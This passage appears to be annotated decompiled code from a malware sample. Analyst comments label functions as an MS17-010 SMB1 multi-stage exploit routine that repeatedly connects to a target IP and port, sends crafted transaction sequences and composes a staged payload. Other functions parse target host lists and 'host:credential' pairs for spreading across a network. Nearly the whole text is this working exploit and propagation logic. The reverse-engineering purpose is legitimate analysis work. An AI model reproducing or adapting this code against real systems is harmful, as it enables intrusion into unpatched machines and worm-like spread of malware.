    if (attempt_stage_result != -0x3ffffdfb) goto LAB_10006618;
    if (payload_builder_callback == (undefined *)0x0) goto LAB_100065f8;
    if (2 < g_smb_attempt_state) goto LAB_10006618;
    g_smb_attempt_state = g_smb_attempt_state + 1;
    if ((((char)local_24 == '\x02') || ((char)local_24 == '\x03')) || ((char)local_24 == '\x04')) {
      local_10 = (byte *)((uint)local_10 & 0xffffff00);
      attempt_stage_result = Smb1RunFragmentedTransactionSequence_10003EC8(*puVar10,(short)first_tick_tag_low16,(short)local_34,0xfeff,(short)local_3c,
                           (short)second_tick_tag_low16,(undefined2 *)&local_20);
      if (attempt_stage_result != 0) goto LAB_10006618;
      uVar3 = rand();
      uVar15 = local_34;
      local_30 = (undefined4 *)(uVar3 & 0xffff);
      uVar14 = (ushort)local_34;
      attempt_stage_result = Smb1RunRepeatedTransactionSequence_1000407B(*puVar10,(short)first_tick_tag_low16,uVar14,(short)uVar3,(short)local_3c,
                           (short)local_20);
      uVar18 = local_3c;
      if (attempt_stage_result == 0) {
        uVar16 = (undefined2)local_3c;
        attempt_stage_result = Smb1RunAlternateFragmentSequence_100042DF(*puVar10,(short)first_tick_tag_low16,uVar14,(short)local_30,uVar16,
                             (short *)&second_tick_tag_low16,(short)local_20);
        if ((attempt_stage_result == 0) &&
           (attempt_stage_result = Smb1ExchangeLargeTransactionFragment_1000489C(&local_30,*puVar10,(short)first_tick_tag_low16,uVar14,uVar16,local_20),
           attempt_stage_result == 0)) {
          attempt_stage_result = Smb1PrepareFragmentSequence_10004BA1(*puVar10,(short)first_tick_tag_low16,uVar14,(short)local_30,uVar16,
                               (short)local_20);
          puVar17 = local_20;
          if (attempt_stage_result == 0) {
            attempt_stage_result = Smb1ChainTransactionBuffers_100051F3(*puVar10,(short)first_tick_tag_low16,uVar14,(short)local_30,uVar16);
            if (attempt_stage_result != 0) goto LAB_10006641;
            attempt_stage_result = Smb1StageMultiRequestExchange_10005333(*puVar10,first_tick_tag_low16,uVar15,local_30,second_tick_tag_low16,puVar17,local_10);
            if (attempt_stage_result == 0) {
              puVar10 = socket_table;
              goto LAB_10005d53;
            }
LAB_10006657:
            uVar8 = *socket_table;
            uVar4 = first_tick_tag_low16;
            uVar15 = local_34;
            puVar17 = local_30;
            uVar18 = local_3c;
            uVar3 = second_tick_tag_low16;
            goto LAB_1000662b;
          }
        }
      }
      else {
LAB_10006641:
        uVar18 = local_3c;
      }
      puVar17 = local_30;
      goto LAB_10006625;
    }
LAB_10005d53:
    if ((((char)local_24 == '\x05') || ((char)local_24 == '\x06')) || ((char)local_24 == '\a')) {
      uVar8 = *puVar10;
      local_14 = 0;
      local_20 = Smb1BuildNtTransactRequest_10002547((short)first_tick_tag_low16,(short)local_34,(short)local_30,(short)local_3c,
                              (short)second_tick_tag_low16);
      if (local_20 != (undefined4 *)0x0) {
        local_18 = (void *)AllocateZeroedHeapBuffer_10001000(0x1000);
        if (local_18 == (void *)0x0) {
          ReleaseTemporaryNetworkBuffer_100020D0();
        }
        else {
          local_c = (undefined4 *)0x0;
          attempt_stage_result = Smb1ReceiveNetworkReply_1000688F((int)local_20);
          pvVar1 = local_18;
          if ((attempt_stage_result == 0) && (attempt_stage_result = Smb1TransmitRequestBuffer_1000243F(uVar8,1), attempt_stage_result == 0)) {
            attempt_stage_result = *(int *)((int)pvVar1 + 9);
            ReleaseTemporaryNetworkBuffer_100020D0();
            ReleaseTemporaryNetworkBuffer_100020D0();
            if ((attempt_stage_result == 0) &&
               (attempt_stage_result = Smb1ProbeTransactionVariantA_10003B5D(uVar8,(short)first_tick_tag_low16,(short)local_34,(short)local_30,
                                     (short)local_3c,(short)second_tick_tag_low16), attempt_stage_result == 0)) {
              Sleep(0x456);
              attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port);
              uVar4 = first_tick_tag_low16;
              uVar3 = second_tick_tag_low16;
              puVar10 = socket_table;
              if (attempt_stage_result != 0) goto LAB_10006657;
              uVar16 = (undefined2)first_tick_tag_low16;
              uVar19 = (undefined2)second_tick_tag_low16;
              attempt_stage_result = Smb1ExchangeInitialRequest_10002EF5(0xc053,uVar16,(short)local_30,uVar19);
              if (attempt_stage_result == 0) {
                local_14 = 0;
                attempt_stage_result = Smb1ExchangeSessionSetup_10002F88(0xc007,uVar16,(short)local_30,(undefined2 *)&local_14,uVar19,
                                     0xc,0x12d,0xfff0,&local_28,(undefined2 *)&local_1c);
                if (attempt_stage_result == 0) {
                  attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port);
                  if (((((((attempt_stage_result == 0) &&
                          (attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0)) &&
                         (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0)) &&
                        ((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0 &&
                         (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0)))) &&
                       ((((attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0 &&
                          ((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0 &&
                           (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0)))) &&
                         (attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0)) &&
                        ((((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0 &&
                           (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0)) &&
                          (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0)) &&
                         ((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0 &&
                          (attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0))))))))
                      && (((attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0 &&
                           ((attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0 &&
                            (attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0))))
                          && ((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0 &&
                              (((attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0 &&
                                (attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0))
                               && (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0)))))))) &&
                     ((((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0 &&
                        (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0)) &&
                       ((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0 &&
                        ((attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0 &&
                         (attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result == 0)))))) &&
                      (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result == 0)))) {
                    Sleep(0x456);
                    uVar3 = second_tick_tag_low16;
                    uVar19 = (undefined2)second_tick_tag_low16;
                    attempt_stage_result = Smb1ExchangeInitialRequest_10002EF5(0xc053,uVar16,(short)local_30,uVar19);
                    if ((attempt_stage_result == 0) &&
                       (attempt_stage_result = Smb1ExchangeSessionSetup_10002F88(0x4007,uVar16,(short)local_30,(undefined2 *)&local_14,
                                             uVar19,0xc,300,0x87f8,&local_28,(undefined2 *)&local_1c
                                            ), attempt_stage_result == 0)) {
                      if (puVar10[1] != 0) {
                        Ordinal_3(puVar10[1]);
                        puVar10[1] = 0;
                      }
                      attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port);
                      if ((((((attempt_stage_result != 0) || (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result != 0)) ||
                            (attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result != 0)) ||
                           ((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result != 0 ||
                            (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result != 0)))) ||
                          ((attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result != 0 ||
                           ((attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result != 0 ||
                            (attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port), attempt_stage_result != 0))))))
                         || ((attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result != 0 ||
                             (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result != 0)))) goto LAB_10006684;
                      if (puVar10[0xf] != 0) {
                        Ordinal_3(puVar10[0xf]);
                        puVar10[0xf] = 0;
                      }
                      uVar3 = second_tick_tag_low16;
                      uVar19 = (undefined2)second_tick_tag_low16;
                      attempt_stage_result = Smb1SendAndReceiveEcho_1000369D(uVar16,(short)local_34,(short)local_30,(short)local_3c,
                                           uVar19);
                      uVar8 = *puVar10;
                      uVar15 = local_34;
                      puVar17 = local_30;
                      uVar18 = local_3c;
                      if (attempt_stage_result != 0) goto LAB_1000662b;
                      attempt_stage_result = Smb1ProbeTransactionVariantB_10003C0A(uVar8,uVar16,(short)local_34,(short)local_30,
                                           (short)local_3c,uVar19);
                      if (attempt_stage_result == 0) {
                        local_1c = 2;
                        do {
                          if ((local_1c != 0xf) && (attempt_stage_result = Smb1PrepareComplexTransaction_10003CA0(), attempt_stage_result != 0))
                          goto LAB_10006673;
                          local_1c = local_1c + 1;
                        } while ((int)local_1c < 0x14);
                        attempt_stage_result = 2;
                        while( true ) {
                          if ((attempt_stage_result != 0xf) && (iVar5 = Smb1PrepareComplexTransaction_10003CA0(), iVar5 != 0))
                          goto LAB_10006684;
                          attempt_stage_result = attempt_stage_result + 1;
                          if (0x13 < attempt_stage_result) break;
                          puVar10 = socket_table;
                          uVar4 = first_tick_tag_low16;
                        }
                        puVar10 = socket_table;
                        goto LAB_100062cd;
                      }
                    }
                  }
                  else {
LAB_10006684:
                    uVar3 = second_tick_tag_low16;
                  }
                }
              }
LAB_10006673:
              uVar8 = *puVar10;
              uVar15 = local_34;
              puVar17 = local_30;
              uVar18 = local_3c;
              goto LAB_1000662b;
            }
          }
          else {
            ReleaseTemporaryNetworkBuffer_100020D0();
            ReleaseTemporaryNetworkBuffer_100020D0();
          }
          puVar10 = socket_table;
        }
      }
      puVar17 = local_30;
      goto LAB_10006621;
    }
LAB_100062cd:
    Smb1CleanupSession_10005A46(0,*puVar10,(short)first_tick_tag_low16,(short)local_34,(short)local_30,(short)local_3c,
                 (short)second_tick_tag_low16);
    WinsockCleanupAfterAttempt_10002068();
    Sleep(0x456);
  } while( true );
  while( true ) {
    local_28 = local_28 + 0x1000;
    local_14 = local_14 + 1;
    if (uVar3 <= local_14) break;
    attempt_stage_result = Smb1WriteTransactionFragments_10003DD7(*puVar10,(short)first_tick_tag_low16,(short)local_34,0xfeff,(short)local_3c,
                         (short)second_tick_tag_low16 + 1,local_10,0x1000,(int)local_24,local_20,local_28,
                         (int *)&local_18);
    if (attempt_stage_result != 0) goto LAB_10006613;
  }
LAB_100065a5:
  Sleep(0x456);
  if (((ushort)local_c == 0) ||
     (attempt_stage_result = Smb1WriteTransactionFragments_10003DD7(*puVar10,(short)first_tick_tag_low16,(short)local_34,0xfeff,(short)local_3c,
                           (short)second_tick_tag_low16 + 1,local_10,(ushort)local_c,(int)local_24,local_20,
                           local_28,(int *)&local_18), attempt_stage_result == 0)) {
    ReleaseTemporaryNetworkBuffer_100020D0();
LAB_100065f8:
    uVar16 = 0xfeff;
    uVar8 = *puVar10;
    uVar13 = 0;
    uVar4 = first_tick_tag_low16;
    uVar15 = local_34;
    uVar18 = local_3c;
    uVar3 = second_tick_tag_low16;
  }
  else {
LAB_10006613:
    ReleaseTemporaryNetworkBuffer_100020D0();
LAB_10006618:
    puVar17 = (undefined4 *)0xfeff;
LAB_10006621:
    uVar15 = local_34;
    uVar18 = local_3c;
LAB_10006625:
    uVar8 = *puVar10;
    uVar4 = first_tick_tag_low16;
    uVar3 = second_tick_tag_low16;
LAB_1000662b:
    uVar16 = SUB42(puVar17,0);
    uVar13 = 0xffffffff;
  }
LAB_1000662d:
  uVar8 = Smb1CleanupSession_10005A46(uVar13,uVar8,(short)uVar4,(short)uVar15,uVar16,(short)uVar18,(short)uVar3);
  return uVar8;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1RunTwoPhaseExploitAttempt_1000668A
 * Ghidra symbol: FUN_1000668a | VA: 0x1000668A | original source line: 5593
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetTickCount
 * Direct function references: ComposeStagedPayloadBuffer_10001F74, WinsockCleanupAfterAttempt_10002068, Smb1Ms17010MultiStageAttempt_10005A7E
 * Local name rewrites: DVar1 -> initial_tick_count, iVar2 -> attempt_result, local_58 -> socket_state
 * Parameter names recovered semantically: param_1 -> target_ipv4_address, param_2 -> builder_argument_a, param_3 -> builder_argument_b, param_4 -> builder_argument_c, param_5 -> builder_argument_d, param_6 -> builder_argument_e, param_7 -> builder_argument_f
 * ANALYST OBSERVATION: Calls the 0x10005A7E coordinator with NULL callback, then (conditioned on return) with 0x10001F74.
 * ANALYST OBSERVATION: The two-phase call is grounded in the decompiled source; a precise CVE label for each path remains unproven.
 */
int Smb1RunTwoPhaseExploitAttempt_1000668A(undefined4 target_ipv4_address,undefined4 builder_argument_a,undefined4 builder_argument_b,undefined4 builder_argument_c,
                undefined4 builder_argument_d,undefined4 builder_argument_e,undefined4 builder_argument_f)

{
  DWORD initial_tick_count;
  int attempt_result;
  undefined4 socket_state [21];
  
  memset(socket_state,0,0x54);
  initial_tick_count = GetTickCount();
  g_smb_attempt_state = 0;
  DAT_1001fb48._0_2_ = (short)initial_tick_count;
  attempt_result = Smb1Ms17010MultiStageAttempt_10005A7E(socket_state,target_ipv4_address,0x1bd,(undefined *)0x0,builder_argument_a,builder_argument_b,builder_argument_c,builder_argument_d,
                       builder_argument_e,builder_argument_f);
  if (attempt_result == 0) {
    g_smb_attempt_state = 0;
    attempt_result = Smb1Ms17010MultiStageAttempt_10005A7E(socket_state,target_ipv4_address,0x1bd,ComposeStagedPayloadBuffer_10001F74,builder_argument_a,builder_argument_b,builder_argument_c,builder_argument_d,builder_argument_e
                         ,builder_argument_f);
    WinsockCleanupAfterAttempt_10002068();
  }
  else {
    WinsockCleanupAfterAttempt_10002068();
  }
  return attempt_result;
}



/*
 * RECONSTRUCTED FUNCTION: OpenTcpConnectionToSmbTarget_10006727
 * Ghidra symbol: FUN_10006727 | VA: 0x10006727 | original source line: 5621
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: Ordinal_23, Ordinal_10, Ordinal_9, Ordinal_11, Ordinal_4
 * Direct function references: none mapped
 * Local name rewrites: iVar4 -> socket_descriptor, uVar5 -> connection_status
 * Parameter names recovered semantically: param_1 -> socket_table, param_2 -> remote_ipv4_address, param_3 -> remote_tcp_port
 */
undefined4 OpenTcpConnectionToSmbTarget_10006727(int *socket_table,undefined4 remote_ipv4_address,undefined4 remote_tcp_port)

{
  byte bVar1;
  int iVar2;
  undefined2 uVar3;
  int socket_descriptor;
  undefined4 connection_status;
  byte *unaff_EBX;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 local_c [2];
  
  socket_descriptor = Ordinal_23(2,1,6);
  local_c[0] = 1;
  Ordinal_10(socket_descriptor,0x8004667e,local_c);
  if ((socket_descriptor == -1) || (bVar1 = *unaff_EBX, 0x1f < bVar1)) {
    connection_status = 0xffffffff;
  }
  else {
    iVar2 = *socket_table;
    *unaff_EBX = bVar1 + 1;
    *(int *)(iVar2 + (uint)bVar1 * 4) = socket_descriptor;
    local_18 = 0;
    uStack_14 = 0;
    uStack_10 = 0;
    local_1c = 2;
    uVar3 = Ordinal_9(remote_tcp_port);
    local_1c = CONCAT22(uVar3,(undefined2)local_1c);
    local_18 = Ordinal_11(remote_ipv4_address);
    Ordinal_4(socket_descriptor,&local_1c,0x10);
    connection_status = 0;
  }
  return connection_status;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1SendFramedNetworkPacket_100067AF
 * Ghidra symbol: FUN_100067af | VA: 0x100067AF | original source line: 5661
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: Ordinal_18, Ordinal_16, Ordinal_9
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> socket_handle, param_2 -> request_fragment_count, param_3 -> wire_buffer_length_inout
 */
undefined4 Smb1SendFramedNetworkPacket_100067AF(undefined4 socket_handle,byte request_fragment_count,int *wire_buffer_length_inout)

{
  uint uVar1;
  ushort uVar2;
  short sVar3;
  int iVar4;
  uint uVar5;
  int *unaff_EBX;
  ushort *unaff_ESI;
  uint uVar6;
  undefined4 local_110;
  undefined4 local_10c [64];
  undefined4 local_c;
  undefined4 local_8;
  
  memset(local_10c,0,0x100);
  local_c = 0;
  local_10c[0] = socket_handle;
  local_8 = 13000000;
  local_110 = 1;
  iVar4 = Ordinal_18(0,&local_110,0,0,&local_c);
  if ((iVar4 != -1) && (iVar4 != 0)) {
    uVar2 = Ordinal_16(socket_handle,*unaff_EBX,*wire_buffer_length_inout,0);
    *unaff_ESI = uVar2;
    if (0 < (short)uVar2) {
      sVar3 = Ordinal_9(*(undefined2 *)(*unaff_EBX + 2));
      uVar6 = (uint)(ushort)(sVar3 + 4) * (uint)request_fragment_count;
      uVar5 = (uint)*unaff_ESI;
      uVar1 = uVar5;
      if (uVar5 != uVar6) {
        while (uVar1 < uVar6) {
          sVar3 = Ordinal_16(socket_handle,*unaff_EBX + uVar5,*wire_buffer_length_inout - uVar5,0);
          if (sVar3 < 1) {
            return 0xffffffff;
          }
          *unaff_ESI = *unaff_ESI + sVar3;
          uVar5 = (uint)*unaff_ESI;
          uVar1 = (uint)*unaff_ESI;
        }
      }
      return 0;
    }
  }
  return 0xffffffff;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1ReceiveNetworkReply_1000688F
 * Ghidra symbol: FUN_1000688f | VA: 0x1000688F | original source line: 5710
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: Ordinal_18, Ordinal_19
 * Direct function references: none mapped
 */
int Smb1ReceiveNetworkReply_1000688F(int param_1)

{
  int iVar1;
  undefined4 local_110;
  undefined4 local_c;
  undefined4 local_8;
  
  if (param_1 != 0) {
    memset((void *)((int)register0x00000010 + -0x10c),0,0x100);
    local_c = 0;
    local_8 = 13000000;
    local_110 = 1;
    iVar1 = Ordinal_18(0,0,&local_110,0,&local_c);
    if ((iVar1 != -1) && (iVar1 != 0)) {
      iVar1 = Ordinal_19();
      return (0 < iVar1) - 1;
    }
  }
  return -1;
}



/*
 * RECONSTRUCTED FUNCTION: ConvertSmbAddressToWideString_10006916
 * Ghidra symbol: FUN_10006916 | VA: 0x10006916 | original source line: 5734
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: none mapped
 */
LPWSTR ConvertSmbAddressToWideString_10006916(LPCSTR param_1)

{
  int iVar1;
  HANDLE hHeap;
  LPWSTR lpWideCharStr;
  DWORD dwFlags;
  SIZE_T dwBytes;
  
  iVar1 = MultiByteToWideChar(0xfde9,0,param_1,-1,(LPWSTR)0x0,0);
  if (iVar1 != 0) {
    dwBytes = iVar1 * 2;
    dwFlags = 0;
    hHeap = GetProcessHeap();
    lpWideCharStr = HeapAlloc(hHeap,dwFlags,dwBytes);
    if ((lpWideCharStr != (LPWSTR)0x0) &&
       (iVar1 = MultiByteToWideChar(0xfde9,0,param_1,-1,lpWideCharStr,iVar1), iVar1 != 0)) {
      return lpWideCharStr;
    }
  }
  return (LPWSTR)0x0;
}



/*
 * RECONSTRUCTED FUNCTION: ComputeElapsedTimeInterval_10006973
 * Ghidra symbol: FUN_10006973 | VA: 0x10006973 | original source line: 5759
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetTickCount
 * Direct function references: none mapped
 */
uint ComputeElapsedTimeInterval_10006973(void)

{
  DWORD DVar1;
  uint uVar2;
  
  DVar1 = GetTickCount();
  uVar2 = (DVar1 - g_start_tick_count) / 60000;
  return -(uint)(uVar2 < g_runtime_wait_minutes) & g_runtime_wait_minutes - uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: ParseNetworkTargetArguments_100069A2
 * Ghidra symbol: FUN_100069a2 | VA: 0x100069A2 | original source line: 5772
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: QueueNetworkHostFromArgument_10006FC7
 */
uint ParseNetworkTargetArguments_100069A2(void)

{
  LPWSTR pWVar1;
  WCHAR WVar2;
  int in_EAX;
  LPCWSTR lpCmdLine;
  LPWSTR *hMem;
  uint uVar3;
  WCHAR *pWVar4;
  LPWSTR pWVar5;
  int iVar6;
  uint local_c;
  int local_8;
  
  lpCmdLine = (LPCWSTR)(in_EAX + 4);
  iVar6 = 0;
  local_c = 1;
  WVar2 = *lpCmdLine;
  pWVar4 = lpCmdLine;
  while (WVar2 != L'\0') {
    pWVar4 = pWVar4 + 1;
    if (*pWVar4 == L';') {
      *pWVar4 = L' ';
    }
    WVar2 = *pWVar4;
  }
  local_8 = 0;
  hMem = CommandLineToArgvW(lpCmdLine,&local_8);
  if (hMem != (LPWSTR *)0x0) {
    if (0 < local_8) {
      do {
        pWVar5 = hMem[iVar6];
        pWVar1 = pWVar5 + 1;
        do {
          WVar2 = *pWVar5;
          pWVar5 = pWVar5 + 1;
        } while (WVar2 != L'\0');
        if ((uint)((int)pWVar5 - (int)pWVar1 >> 1) < 0x10) {
          uVar3 = QueueNetworkHostFromArgument_10006FC7(DAT_1001f140);
          local_c = local_c & uVar3;
        }
        iVar6 = iVar6 + 1;
      } while (iVar6 < local_8);
    }
    LocalFree(hMem);
  }
  return local_c;
}



/*
 * RECONSTRUCTED FUNCTION: ParseRuntimeContext_10006A2B
 * Ghidra symbol: FUN_10006a2b | VA: 0x10006A2B | original source line: 5824
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: ParseNetworkTargetArguments_100069A2, QueueNetworkTargetWithCredentials_10006DE0
 */
undefined4 ParseRuntimeContext_10006A2B(LPCWSTR param_1)

{
  WCHAR WVar1;
  LPCWSTR pWVar2;
  LPWSTR *hMem;
  int iVar3;
  LPWSTR pWVar4;
  uint uVar5;
  uint local_8;
  
  if (param_1 != (LPCWSTR)0x0) {
    pWVar2 = param_1;
    do {
      WVar1 = *pWVar2;
      pWVar2 = pWVar2 + 1;
    } while (WVar1 != L'\0');
    if ((int)pWVar2 - (int)(param_1 + 1) >> 1 != 0) {
      local_8 = 0;
      hMem = CommandLineToArgvW(param_1,(int *)&local_8);
      if (hMem != (LPWSTR *)0x0) {
        if (0 < (int)local_8) {
          iVar3 = StrToIntW(*hMem);
          uVar5 = 1;
          if (0 < iVar3) {
            g_runtime_wait_minutes = iVar3;
          }
          if (1 < local_8) {
            do {
              pWVar2 = hMem[uVar5];
              pWVar4 = StrStrW(pWVar2,L"-h");
              if (pWVar2 == pWVar4) {
                ParseNetworkTargetArguments_100069A2();
                break;
              }
              pWVar4 = StrChrW(pWVar2,L':');
              if (pWVar4 != (LPWSTR)0x0) {
                *pWVar4 = L'\0';
                QueueNetworkTargetWithCredentials_10006DE0(pWVar2,pWVar4 + 1,1);
              }
              uVar5 = uVar5 + 1;
            } while (uVar5 < local_8);
          }
        }
        LocalFree(hMem);
      }
    }
  }
  if (g_runtime_wait_minutes == 0) {
    g_runtime_wait_minutes = 0x3c;
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

/*
 * RECONSTRUCTED FUNCTION: RefreshNetworkWorkItemText_10006AF0
 * Ghidra symbol: FUN_10006af0 | VA: 0x10006AF0 | original source line: 5882
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: AllocateNetworkWorkItem_1000711F, SelectNextNetworkWorkItem_10007167
 */
void RefreshNetworkWorkItemText_10006AF0(void)

{
  WCHAR WVar1;
  undefined4 *lpMem;
  WCHAR *pWVar2;
  int iVar3;
  HANDLE hHeap;
  uint uVar4;
  DWORD dwFlags;
  WCHAR local_808;
  undefined1 local_806 [2046];
  int *local_8;
  
  DAT_1001b110 = 0;
  uVar4 = 0;
  local_8 = (int *)0x0;
  lpMem = AllocateNetworkWorkItem_1000711F(1,(int *)&local_8);
  if (lpMem != (undefined4 *)0x0) {
    do {
      wsprintfW(&local_808,L" \"%ws:%ws\"",*(undefined4 *)*local_8,((undefined4 *)*local_8)[1]);
      pWVar2 = &local_808;
      do {
        WVar1 = *pWVar2;
        pWVar2 = pWVar2 + 1;
      } while (WVar1 != L'\0');
      uVar4 = ((int)pWVar2 - (int)local_806 >> 1) + uVar4;
      if (0x1ff4 < uVar4) break;
      StrCatW(&DAT_1001b110,&local_808);
      local_8 = (int *)0x0;
      iVar3 = SelectNextNetworkWorkItem_10007167((int *)&local_8);
    } while (iVar3 != 0);
    dwFlags = 0;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,lpMem);
  }
  DAT_10016010 = 0;
  _DAT_1001f0f8 = 0;
  return;
}



/*
 * RECONSTRUCTED FUNCTION: ComposeNetworkWorkItemParameters_10006BB0
 * Ghidra symbol: FUN_10006bb0 | VA: 0x10006BB0 | original source line: 5925
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: ComputeElapsedTimeInterval_10006973, RefreshNetworkWorkItemText_10006AF0
 */
uint ComposeNetworkWorkItemParameters_10006BB0(LPWSTR param_1)

{
  uint uVar1;
  WCHAR WVar2;
  short *psVar3;
  uint uVar4;
  WCHAR *pWVar5;
  short *psVar6;
  WCHAR local_804;
  undefined1 local_802 [2046];
  
  uVar4 = ComputeElapsedTimeInterval_10006973();
  if (uVar4 < 10) {
    uVar4 = 10;
  }
  wsprintfW(&local_804,L"%d",uVar4);
  pWVar5 = &local_804;
  do {
    WVar2 = *pWVar5;
    pWVar5 = pWVar5 + 1;
  } while (WVar2 != L'\0');
  uVar4 = (int)pWVar5 - (int)local_802 >> 1;
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_1001f124);
  if (DAT_10016010 != 0) {
    RefreshNetworkWorkItemText_10006AF0();
  }
  psVar3 = &DAT_1001b110;
  do {
    psVar6 = psVar3;
    psVar3 = psVar6 + 1;
  } while (*psVar6 != 0);
  uVar1 = ((int)(psVar6 + -0x800d888) >> 1) + uVar4;
  if (uVar1 < 0x1ffe) {
    *param_1 = L'\0';
    StrCatW(param_1,&local_804);
    StrCatW(param_1,&DAT_1001b110);
    uVar4 = uVar1;
  }
  else {
    SetLastError(0x7a);
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_1001f124);
  return uVar4;
}



/*
 * RECONSTRUCTED FUNCTION: CompareNetworkTargetEntries_10006C74
 * Ghidra symbol: FUN_10006c74 | VA: 0x10006C74 | original source line: 5973
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 CompareNetworkTargetEntries_10006C74(undefined4 *param_1,undefined4 *param_2)

{
  int iVar1;
  undefined4 uVar2;
  
  uVar2 = 0;
  iVar1 = StrCmpIW((LPCWSTR)*param_1,(LPCWSTR)*param_2);
  if (iVar1 == 0) {
    iVar1 = StrCmpW((LPCWSTR)param_1[1],(LPCWSTR)param_2[1]);
    if (iVar1 == 0) {
      uVar2 = 1;
    }
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: FreeNetworkTargetEntry_10006CAA
 * Ghidra symbol: FUN_10006caa | VA: 0x10006CAA | original source line: 5992
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: none mapped
 */
void FreeNetworkTargetEntry_10006CAA(int *param_1)

{
  HANDLE pvVar1;
  DWORD DVar2;
  LPVOID pvVar3;
  
  if (param_1 != (int *)0x0) {
    pvVar3 = (LPVOID)*param_1;
    if (pvVar3 != (LPVOID)0x0) {
      DVar2 = 0;
      pvVar1 = GetProcessHeap();
      HeapFree(pvVar1,DVar2,pvVar3);
    }
    pvVar3 = (LPVOID)param_1[1];
    if (pvVar3 != (LPVOID)0x0) {
      DVar2 = 0;
      pvVar1 = GetProcessHeap();
      HeapFree(pvVar1,DVar2,pvVar3);
    }
  }
  return;
}



/*
